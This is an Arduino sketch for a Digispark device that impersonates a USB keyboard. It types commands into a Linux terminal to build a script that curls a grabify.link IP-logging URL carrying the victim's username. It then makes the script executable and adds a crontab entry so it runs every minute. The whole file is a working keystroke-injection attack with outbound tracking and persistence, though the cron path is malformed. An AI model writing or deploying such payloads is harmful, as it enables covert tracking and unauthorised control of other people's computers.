#include "DigiKeyboard.h"
#define KEY_ESC   41

void setup() {
  // don't need to set anything up to use DigiKeyboard
}
void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:

  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_F1,MOD_ALT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("terminal");
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  // add curl
  DigiKeyboard.print("echo");
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.print("curl --silent --output /dev/null --referer \"$(whoami)\" https://grabify.link/SHP5LN > /tmp/slrcurl.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Change the permissions for the file...
  DigiKeyboard.println("chmod 755 /tmp/slrcurl.sh");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(200);
  
  //cron part
  DigiKeyboard.print("export VISUAL=nano; crontab -e");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("* * * * * \tmp\slrcurl.sh");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);


for(;;){ /*empty*/ }
}
